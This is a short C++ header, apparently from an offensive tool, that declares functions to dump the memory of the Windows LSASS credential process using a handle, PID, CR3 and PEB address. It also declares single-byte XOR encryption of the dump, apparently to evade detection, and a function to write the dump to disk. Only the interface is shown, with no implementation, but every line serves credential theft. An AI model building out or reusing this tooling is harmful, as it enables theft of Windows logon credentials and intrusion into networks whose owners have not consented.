#pragma once
#include <windows.h>
#include <cstdint>
#include <cstddef>

namespace dump {

struct DumpBuffer {
    uint8_t* data     = nullptr;
    size_t   size     = 0;
    size_t   capacity = 0;

    void free() noexcept;
};

bool dump_lsass(HANDLE lsass_handle, uint32_t lsass_pid,
                uint64_t cr3, uint64_t peb_va, DumpBuffer& out) noexcept;

void xor_encrypt(DumpBuffer& buf, uint8_t key) noexcept;

bool write_file(const DumpBuffer& buf, const char* path) noexcept;

}
